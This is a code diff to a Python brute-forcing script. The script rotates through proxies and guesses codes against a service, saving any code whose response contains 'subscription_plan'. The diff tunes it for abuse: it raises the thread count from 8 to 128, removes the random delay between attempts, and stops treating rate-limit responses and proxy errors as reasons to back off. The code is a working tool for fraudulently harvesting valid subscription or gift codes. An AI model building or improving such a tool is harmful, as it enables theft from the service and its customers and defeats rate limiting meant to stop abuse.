@@ -4,10 +4,12 @@ import requests
 import threading
 import sys
 import os, os.path
-from time import sleep
+import time
 from requests.exceptions import ProxyError, SSLError, ConnectionError, InvalidProxyURL
 
-cpu_cores = 8
+cpu_cores = 128
+timeout = 5;
+start_time = time.time()
 os.environ["_THREADS"] = "0"
 threads = []
 proxies = []
@@ -29,6 +31,7 @@ def initProxyList():
     to_write = ''
     for proxy in proxies:
         to_write += proxy + '\n'
+    to_write = to_write[:-1]
     f.write(to_write)
     f.close()
  
@@ -91,26 +94,27 @@ class bruteforceThread(threading.Thread):
                 proxy = {'https': 'https://' + raw_proxy}
 
                 s = requests.session()
-                response = s.get(url, proxies=proxy)
+                response = s.get(url, proxies=proxy, timeout=timeout, headers={'Connection':'close'})
+                s.close()
                 log_msg = "Used proxy: " + raw_proxy + "\n" + "Used code: " + current_code + "\n\n>>>>>>>>>> " + response.text.replace("\n", "\n>>>>>>>>>> ")
                 writeLog(log_msg)
                 if 'subscription_plan' in response.text:
                     saveCode(current_code)
-                elif 'Access denied' in response.text or 'rate limited' in response.text:
+                elif 'Access denied' in response.text:# or 'rate limited' in response.text:
                     flagInvalidProxy(raw_proxy)
                 else:
                     codes_tried += 1
-                    sleep(random.uniform(0.05, 0.5))
+                    #time.sleep(random.uniform(0.05, 0.5))
             except ProxyError:
                 pass
             except SSLError:
-                flagInvalidProxy(raw_proxy)
+                #flagInvalidProxy(raw_proxy)
                 pass
             except ConnectionError:
-                flagInvalidProxy(raw_proxy)
+                #flagInvalidProxy(raw_proxy)
                 pass
             except InvalidProxyURL:
-                flagInvalidProxy(raw_proxy)
+                #flagInvalidProxy(raw_proxy)
                 pass
             else:
                 pass
@@ -132,11 +136,11 @@ while True:
         os.system('cls' if os.name == 'nt' else 'clear')
         info = ""
         info += "Threads active: " + os.environ["_THREADS"]
-        info += "\nAttempts: " + str(codes_tried)
+        info += "\nAttempts: " + str(codes_tried) + " (" + str(round(codes_tried / (time.time() - start_time), 3)) + " / s)"
         info += "\nProxies: " + str(len(proxies))
         info += "\nInvalid proxies: " + str(invalid_proxies)
         info += "\nCodes Found: " + str(codes_found)
         print(info)
-        sleep(2)
+        time.sleep(0.5)
     except KeyboardInterrupt:
         exit(0)
